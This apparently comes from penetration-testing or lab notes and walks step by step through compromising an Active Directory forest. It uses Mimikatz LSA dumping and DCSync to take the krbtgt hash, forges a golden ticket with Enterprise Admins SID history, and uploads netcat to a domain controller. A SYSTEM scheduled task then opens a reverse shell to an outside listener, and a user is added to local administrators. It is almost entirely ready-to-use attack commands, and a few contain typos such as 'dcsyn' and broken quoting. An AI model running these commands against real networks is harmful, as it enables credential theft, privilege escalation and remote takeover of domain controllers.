## Steps to Compromise
Domains in the same forest have implicit two-way trust with other domains. There is a trust key 
between the parent and child domains. One way of escalating privileges between domain 
and domain is with the krbtgt hash.
We will abuse SID history to allow ad user to access domain via the Enterprise Admins group 
sid
```
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
```
Now We need to grab the krbtgt hash, we can do this by doing a dcsync against domain.
```
Invoke-Mimikatz -Command '"lsadump::dcsyn /domain:[domain]
/all
```
Now create and pass the ticket, to add SID History of the Enterprise Admin group.
```
Invoke-Mimikatz -Command '"kerberos::golden /user:examad 
/domain:domain /sid:[sid] 
/sids:[sid] 
/krbtgt:[krbtgt] /ptt”’
```
Let’s verify by running a gwmi command.
```
gwmi -class win32_operatingsystem -ComputerName [computername]
```
Now let’s upload nc.exe to a directory on DC
```
Copy-Item .\nc.exe \\[domain]\C$\Users\Public\Downloads
```
Now we can create a scheduled task to execute nc.exe and giving us a reverse shell on port 443.
```
schtasks /create /S [domain] /SC Weekly /RU "NT 
Authority\SYSTEM" /TN "WINNER" /TR "C:\Users\Public\Downloads\nc.exe -e cmd 
[ip] 443"
```
Now We can Run the scheduled task:
```
schtasks /Run /S [domain /TN "WINNER"
```
Once the scheduled task runs, we catch a shell from our netcat listener on port 443 as SYSTEM.
```
nc -lvnp 443
whoami
hostname
```
We can add examad to the local administrator group to become a Domain Admin on domain
```
net localgroup "Administrators" ad /add
net localgroup "Administrators"
```

